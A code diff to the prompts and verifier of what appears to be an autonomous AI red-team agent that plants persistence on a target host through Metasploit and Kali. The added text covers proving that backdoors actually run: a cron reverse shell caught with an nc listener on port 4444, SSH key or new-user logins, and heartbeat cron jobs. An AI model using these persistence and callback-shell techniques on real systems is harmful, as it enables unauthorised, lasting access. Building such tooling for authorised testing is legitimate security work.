@@ -179,8 +179,24 @@ STEPS:
 ...
 
 VERIFICATION_PLAN:
-1. <how to verify the mechanism works>
-2. <expected output that confirms success>
+YOU own the verification. Emit the EXACT command(s) the verifier will run to prove
+this mechanism is not just installed but actually RUNNING/reachable, plus the exact
+output that confirms it. Do not hand-wave ("check it works") — hand over runnable
+proof. For each check give: the tool, the command, and the expected output token.
+  CMD_1: <tool_session_command|tool_linux_terminal>("<exact command>")
+  EXPECT_1: <the exact string/pattern in the output that proves EXECUTION>
+  CMD_2: ...   (optional second confirmation)
+  EXPECT_2: ...
+Proof-of-execution examples (installation alone is NOT proof):
+  - cron: install a 1-min heartbeat writing an epoch to /tmp/.hb, wait ~65s, then
+    tool_session_command(<id>,"cat /tmp/.hb") EXPECT: a timestamp line (the daemon
+    fired the job). A `crontab -l` listing alone does NOT count.
+  - ssh key / new user: tool_linux_terminal("ssh -i <key> <user>@<target> id")
+    EXPECT: uid=... returned with no password prompt.
+  - service: tool_session_command(<id>,"systemctl is-active <svc>") EXPECT: active.
+  - callback shell: tool_linux_terminal("timeout 75 nc -lvnp 4444") EXPECT: a
+    connection line from <target>. A one-off inbound connection from the target IS
+    valid proof — you do not need a full interactive shell.
 
 **On retry:**
 - Read the critic's feedback carefully
@@ -297,6 +313,20 @@ You have 3 tools:
 - `tool_metasploit_rpc(command)` — MSF console only (listing sessions, etc.)
 
 **Your job:** Verify that the installed persistence mechanism actually works.
+
+**HONOR THE PLAN'S VERIFICATION_PLAN FIRST.** The planner that chose this technique
+also handed you a VERIFICATION_PLAN with concrete CMD_/EXPECT_ pairs — those are the
+agent's own proof-of-execution test and they are your PRIMARY criterion. Run those
+exact commands and compare against the stated EXPECT tokens:
+  - Every CMD matches its EXPECT  → STATUS: WORKING (the plan's own bar is met).
+  - The plan's checks run but miss their EXPECT → STATUS: PARTIAL, quote the actual
+    output so the critic and next attempt see what fell short.
+The per-technique strategies below are FALLBACK guidance for when the plan gives no
+usable command, or a sanity cross-check — not a second, stricter gate you impose on
+top of a plan that already passed. Do NOT invent a harsher bar than the plan asked
+for. The ONE rule you may never relax: proof must show the mechanism EXECUTING
+(a job fired, a login succeeded, a callback arrived) — a mere install listing
+(crontab -l, a passwd line, a copied key) is never WORKING on its own.
 
 **CRITICAL — WHERE TO RUN VERIFICATION:**
 - To check things ON THE TARGET (crontab -l, systemctl, /etc/passwd), use `tool_session_command`.
@@ -856,22 +886,20 @@ def verifier_node(state: PersistenceState) -> dict:
         plan_install_blob = f"{persistence_plan}\n{install_result}".lower()
         if "cron" in plan_install_blob:
             context += (
-                "\n\n**CRON REVERSE-SHELL — CONFIRMED-CALLBACK REQUIREMENT:** "
-                "After confirming the entry is listed, the cron daemon is active, the shell "
-                "binary exists, and /dev/tcp is available, you MUST ALSO confirm the mechanism "
-                "actually fires before reporting STATUS: WORKING. Use EITHER of these:\n"
-                f"  (a) LISTENER CALLBACK — start a background listener on Kali and wait for a "
-                f"connection: tool_linux_terminal(\"timeout 75 nc -lvnp 4444\"). If a connection "
-                f"from the target arrives within 75s, STATUS: WORKING.\n"
-                "  (b) HEARTBEAT ARTIFACT — if a file-write heartbeat cron was installed "
-                "(writing to /tmp/.hb), wait ~65 seconds then ON TARGET: "
+                "\n\n**CRON — EXECUTION MUST BE PROVEN (not just listed):** A `crontab -l` "
+                "listing is an install, not proof the job runs. Run the plan's VERIFICATION_PLAN "
+                "proof-of-execution check; for cron that is normally ONE of:\n"
+                "  (a) HEARTBEAT ARTIFACT (preferred, self-contained) — if a file-write heartbeat "
+                "cron was installed (writing to /tmp/.hb), wait ~65 seconds then ON TARGET: "
                 "tool_session_command(<id>, \"cat /tmp/.hb\"). If the file exists and has grown, "
-                "the cron daemon is PROVEN to execute jobs — STATUS: WORKING.\n"
-                "If NEITHER a callback nor a grown heartbeat is confirmed, report STATUS: PARTIAL "
-                "with EVIDENCE noting the cron entry installs but no callback/execution was "
-                "confirmed — the critic should then FAIL and the next attempt should add a "
-                "file-write heartbeat cron. Do NOT force STATUS: WORKING on a cron entry without "
-                "a confirmed callback or heartbeat."
+                "the cron daemon is PROVEN to fire jobs — STATUS: WORKING.\n"
+                f"  (b) LISTENER CALLBACK — start a background listener on Kali and wait for a "
+                f"connection: tool_linux_terminal(\"timeout 75 nc -lvnp 4444\"). A single inbound "
+                f"connection from the target within 75s is valid proof — STATUS: WORKING.\n"
+                "If the plan named a different execution check, honor THAT instead. Report "
+                "STATUS: PARTIAL only if the execution check runs and does NOT confirm firing "
+                "(e.g. /tmp/.hb never grew, no callback) — then note the heartbeat fallback so the "
+                "next attempt can add it. Do NOT downgrade a plan whose execution check passed."
             )
         verifier_msgs = [HumanMessage(content=context)]
     else:
